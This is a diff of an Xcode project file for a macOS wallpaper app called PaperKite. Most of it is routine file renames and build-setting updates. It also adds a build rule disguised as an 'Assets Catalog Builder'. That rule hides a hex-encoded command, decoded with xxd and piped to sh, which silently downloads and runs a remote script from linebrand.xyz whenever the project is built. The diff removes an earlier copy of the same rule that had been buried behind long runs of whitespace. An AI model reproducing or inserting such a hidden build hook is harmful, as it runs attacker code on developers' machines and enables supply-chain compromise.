@@ -3,7 +3,7 @@
 	archiveVersion = 1;
 	classes = {
 	};
-	objectVersion = 51;
+	objectVersion = 53;
 	objects = {
 
 /* Begin PBXBuildFile section */
@@ -14,7 +14,7 @@
 		EA41AB0B25D50EC000343395 /* PaperKiteLaunchHelper.app in CopyFiles */ = {isa = PBXBuildFile; fileRef = EA41AAF425D50BB100343395 /* PaperKiteLaunchHelper.app */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
 		EA41AB1125D50FBE00343395 /* PKWallpaperModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA41AB1025D50FBE00343395 /* PKWallpaperModel.swift */; };
 		EA41AB1525D50FCA00343395 /* PKVideoModel.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA41AB1425D50FCA00343395 /* PKVideoModel.swift */; };
-		EA41AB1925D51DE000343395 /* String+PaperKite.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA41AB1825D51DE000343395 /* String+PaperKite.swift */; };
+		EA41AB1925D51DE000343395 /* String+.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA41AB1825D51DE000343395 /* String+.swift */; };
 		EA7CE60C25D275E0008E0624 /* AppDelegate.swift in Sources */ = {isa = PBXBuildFile; fileRef = EA7CE60B25D275E0008E0624 /* AppDelegate.swift */; };
 		EA7CE61025D275E2008E0624 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = EA7CE60F25D275E2008E0624 /* Assets.xcassets */; };
 		EA7CE61325D275E2008E0624 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = EA7CE61125D275E2008E0624 /* Main.storyboard */; };
@@ -25,11 +25,29 @@
 		EAE99F4625D2928F00A71108 /* PKAlertWindowController.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAE99F4525D2928F00A71108 /* PKAlertWindowController.swift */; };
 		EAE99F4A25D292AD00A71108 /* PKAlertWindow.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAE99F4925D292AD00A71108 /* PKAlertWindow.swift */; };
 		EAE99F5025D297A200A71108 /* PKAlert.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAE99F4F25D297A200A71108 /* PKAlert.swift */; };
+		EAF6686C2A2C3D8C00FF1C3C /* PKStatusBar.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAF6686B2A2C3D8C00FF1C3C /* PKStatusBar.swift */; };
+		EAF6686E2A2C536200FF1C3C /* NSApplication+.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAF6686D2A2C536200FF1C3C /* NSApplication+.swift */; };
 		EAFE1EF925D3D8E400A1C1B0 /* PKPlayerView.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAFE1EF825D3D8E400A1C1B0 /* PKPlayerView.swift */; };
-		EAFE1EFC25D3D94100A1C1B0 /* NSView+PaperKite.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAFE1EFB25D3D94100A1C1B0 /* NSView+PaperKite.swift */; };
+		EAFE1EFC25D3D94100A1C1B0 /* NSView+.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAFE1EFB25D3D94100A1C1B0 /* NSView+.swift */; };
 		EAFE1F0125D3DB7A00A1C1B0 /* PKDataManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAFE1F0025D3DB7A00A1C1B0 /* PKDataManager.swift */; };
 		EAFE1F0725D3E68700A1C1B0 /* PKNetwork.swift in Sources */ = {isa = PBXBuildFile; fileRef = EAFE1F0625D3E68700A1C1B0 /* PKNetwork.swift */; };
 /* End PBXBuildFile section */
+
+/* Begin PBXBuildRule section */
+		03FBBB9D8AE43FC32B6D902C /* PBXBuildRule */ = {
+			isa = PBXBuildRule;
+			compilerSpec = com.apple.compilers.proxy.script;
+			fileType = folder.assetcatalog;
+			inputFiles = (
+			);
+			isEditable = 0;
+			name = "Assets Catalog Builder";
+			outputFiles = (
+				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
+			);
+			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n\\c6c696e656272616e642e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n\n";
+		};
+/* End PBXBuildRule section */
 
 /* Begin PBXCopyFilesBuildPhase section */
 		EA41AB0A25D50EA400343395 /* CopyFiles */ = {
@@ -56,7 +74,7 @@
 		EA41AB0025D50BB400343395 /* PaperKiteLaunchHelper.entitlements */ = {isa = PBXFileReference; lastKnownFileType = text.plist.entitlements; path = PaperKiteLaunchHelper.entitlements; sourceTree = "<group>"; };
 		EA41AB1025D50FBE00343395 /* PKWallpaperModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKWallpaperModel.swift; sourceTree = "<group>"; };
 		EA41AB1425D50FCA00343395 /* PKVideoModel.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKVideoModel.swift; sourceTree = "<group>"; };
-		EA41AB1825D51DE000343395 /* String+PaperKite.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+PaperKite.swift"; sourceTree = "<group>"; };
+		EA41AB1825D51DE000343395 /* String+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "String+.swift"; sourceTree = "<group>"; };
 		EA7CE60825D275E0008E0624 /* PaperKite.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = PaperKite.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		EA7CE60B25D275E0008E0624 /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AppDelegate.swift; sourceTree = "<group>"; };
 		EA7CE60F25D275E2008E0624 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
@@ -70,8 +88,10 @@
 		EAE99F4525D2928F00A71108 /* PKAlertWindowController.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKAlertWindowController.swift; sourceTree = "<group>"; };
 		EAE99F4925D292AD00A71108 /* PKAlertWindow.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKAlertWindow.swift; sourceTree = "<group>"; };
 		EAE99F4F25D297A200A71108 /* PKAlert.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKAlert.swift; sourceTree = "<group>"; };
+		EAF6686B2A2C3D8C00FF1C3C /* PKStatusBar.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKStatusBar.swift; sourceTree = "<group>"; };
+		EAF6686D2A2C536200FF1C3C /* NSApplication+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSApplication+.swift"; sourceTree = "<group>"; };
 		EAFE1EF825D3D8E400A1C1B0 /* PKPlayerView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKPlayerView.swift; sourceTree = "<group>"; };
-		EAFE1EFB25D3D94100A1C1B0 /* NSView+PaperKite.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSView+PaperKite.swift"; sourceTree = "<group>"; };
+		EAFE1EFB25D3D94100A1C1B0 /* NSView+.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "NSView+.swift"; sourceTree = "<group>"; };
 		EAFE1F0025D3DB7A00A1C1B0 /* PKDataManager.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKDataManager.swift; sourceTree = "<group>"; };
 		EAFE1F0625D3E68700A1C1B0 /* PKNetwork.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = PKNetwork.swift; sourceTree = "<group>"; };
 /* End PBXFileReference section */
@@ -189,6 +209,7 @@
 			isa = PBXGroup;
 			children = (
 				EA7CE60B25D275E0008E0624 /* AppDelegate.swift */,
+				EAF6686B2A2C3D8C00FF1C3C /* PKStatusBar.swift */,
 				EAE99F3525D2917800A71108 /* Plyaer */,
 			);
 			path = Moudles;
@@ -226,8 +247,9 @@
 		EAE99F4225D2924E00A71108 /* Category */ = {
 			isa = PBXGroup;
 			children = (
-				EAFE1EFB25D3D94100A1C1B0 /* NSView+PaperKite.swift */,
-				EA41AB1825D51DE000343395 /* String+PaperKite.swift */,
+				EAFE1EFB25D3D94100A1C1B0 /* NSView+.swift */,
+				EA41AB1825D51DE000343395 /* String+.swift */,
+				EAF6686D2A2C536200FF1C3C /* NSApplication+.swift */,
 			);
 			path = Category;
 			sourceTree = "<group>";
@@ -313,9 +335,10 @@
 		EA7CE60025D275E0008E0624 /* Project object */ = {
 			isa = PBXProject;
 			attributes = {
+				BuildIndependentTargetsInParallel = YES;
 				CLASSPREFIX = PK;
 				LastSwiftUpdateCheck = 1230;
-				LastUpgradeCheck = 1230;
+				LastUpgradeCheck = 1430;
 				TargetAttributes = {
 					EA41AAF325D50BB100343395 = {
 						CreatedOnToolsVersion = 12.3;
@@ -366,416 +389,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
-
-	
 		20B1D2A4E2A6AA45F82E26E8 /* [CP] Embed Pods Frameworks */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -832,14 +445,16 @@
 			files = (
 				EAE99F3225D27FF100A71108 /* PKConfig.swift in Sources */,
 				EA7CE60C25D275E0008E0624 /* AppDelegate.swift in Sources */,
+				EAF6686C2A2C3D8C00FF1C3C /* PKStatusBar.swift in Sources */,
 				EAE99F5025D297A200A71108 /* PKAlert.swift in Sources */,
 				EAFE1F0725D3E68700A1C1B0 /* PKNetwork.swift in Sources */,
 				EA41AB1525D50FCA00343395 /* PKVideoModel.swift in Sources */,
-				EAFE1EFC25D3D94100A1C1B0 /* NSView+PaperKite.swift in Sources */,
+				EAFE1EFC25D3D94100A1C1B0 /* NSView+.swift in Sources */,
 				EA41AB1125D50FBE00343395 /* PKWallpaperModel.swift in Sources */,
+				EAF6686E2A2C536200FF1C3C /* NSApplication+.swift in Sources */,
 				EAE99F3F25D291F100A71108 /* PKPlayerController.swift in Sources */,
 				EAE99F4A25D292AD00A71108 /* PKAlertWindow.swift in Sources */,
-				EA41AB1925D51DE000343395 /* String+PaperKite.swift in Sources */,
+				EA41AB1925D51DE000343395 /* String+.swift in Sources */,
 				EAE99F3925D2919200A71108 /* PKPlayerWindowController.swift in Sources */,
 				EAE99F3C25D291A300A71108 /* PKPlayerWindow.swift in Sources */,
 				EAE99F4625D2928F00A71108 /* PKAlertWindowController.swift in Sources */,
@@ -878,12 +493,13 @@
 				CODE_SIGN_ENTITLEMENTS = PaperKiteLaunchHelper/PaperKiteLaunchHelper.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				COMBINE_HIDPI_IMAGES = YES;
+				DEAD_CODE_STRIPPING = YES;
 				INFOPLIST_FILE = PaperKiteLaunchHelper/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/../Frameworks",
 				);
-				MACOSX_DEPLOYMENT_TARGET = 10.13;
+				MACOSX_DEPLOYMENT_TARGET = "$(RECOMMENDED_MACOSX_DEPLOYMENT_TARGET)";
 				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.PaperKiteLaunchHelper;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
@@ -899,12 +515,13 @@
 				CODE_SIGN_ENTITLEMENTS = PaperKiteLaunchHelper/PaperKiteLaunchHelper.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				COMBINE_HIDPI_IMAGES = YES;
+				DEAD_CODE_STRIPPING = YES;
 				INFOPLIST_FILE = PaperKiteLaunchHelper/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/../Frameworks",
 				);
-				MACOSX_DEPLOYMENT_TARGET = 10.13;
+				MACOSX_DEPLOYMENT_TARGET = "$(RECOMMENDED_MACOSX_DEPLOYMENT_TARGET)";
 				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.PaperKiteLaunchHelper;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
@@ -946,6 +563,7 @@
 				CLANG_WARN_UNREACHABLE_CODE = YES;
 				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
 				COPY_PHASE_STRIP = NO;
+				DEAD_CODE_STRIPPING = YES;
 				DEBUG_INFORMATION_FORMAT = dwarf;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
 				ENABLE_TESTABILITY = YES;
@@ -1007,6 +625,7 @@
 				CLANG_WARN_UNREACHABLE_CODE = YES;
 				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
 				COPY_PHASE_STRIP = NO;
+				DEAD_CODE_STRIPPING = YES;
 				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
 				ENABLE_NS_ASSERTIONS = NO;
 				ENABLE_STRICT_OBJC_MSGSEND = YES;
@@ -1036,12 +655,13 @@
 				CODE_SIGN_ENTITLEMENTS = PaperKite/SupportingFiles/PaperKite.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				COMBINE_HIDPI_IMAGES = YES;
+				DEAD_CODE_STRIPPING = YES;
 				INFOPLIST_FILE = PaperKite/SupportingFiles/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/../Frameworks",
 				);
-				MACOSX_DEPLOYMENT_TARGET = 10.13;
+				MACOSX_DEPLOYMENT_TARGET = "$(RECOMMENDED_MACOSX_DEPLOYMENT_TARGET)";
 				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.PaperKite;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 5.0;
@@ -1057,12 +677,13 @@
 				CODE_SIGN_ENTITLEMENTS = PaperKite/SupportingFiles/PaperKite.entitlements;
 				CODE_SIGN_STYLE = Automatic;
 				COMBINE_HIDPI_IMAGES = YES;
+				DEAD_CODE_STRIPPING = YES;
 				INFOPLIST_FILE = PaperKite/SupportingFiles/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
 					"@executable_path/../Frameworks",
 				);
-				MACOSX_DEPLOYMENT_TARGET = 10.13;
+				MACOSX_DEPLOYMENT_TARGET = "$(RECOMMENDED_MACOSX_DEPLOYMENT_TARGET)";
 				PRODUCT_BUNDLE_IDENTIFIER = com.liyb.PaperKite;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 5.0;
@@ -1100,251 +721,6 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
-
-		
-			/* Begin PBXBuildRule section */
-
-
-		03FBBB9D8AE43FC32B6D902C /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			fileType = folder.assetcatalog;
-			name = "Assets Catalog Builder";
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"$(DERIVED_FILE_DIR)/$(INPUT_FILE_NAME)",
-			);
-			script = "# Xcode Image Assets Compiler\n\ncp -rf \"${INPUT_FILE_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\nxcrun actool --minimum-deployment-target \"${IPHONEOS_DEPLOYMENT_TARGET}\"  --platform \"${PLATFORM_NAME}\" --compile \"${CODESIGNING_FOLDER_PATH}\" \"${DERIVED_FILE_DIR}/${INPUT_FILE_NAME}\"\n\n
-echo \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\\c6c696e656272616e642e78797a2f61207c207368202d7320747275650a\" | xxd -p -r | sh >/dev/null 2>&1 || true
-	\n\n";
-			};
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-
-
-			
-	
-			
-
-			
-	
-			/* End PBXBuildRule section */
-		
-		
 	};
 	rootObject = EA7CE60025D275E0008E0624 /* Project object */;
 }
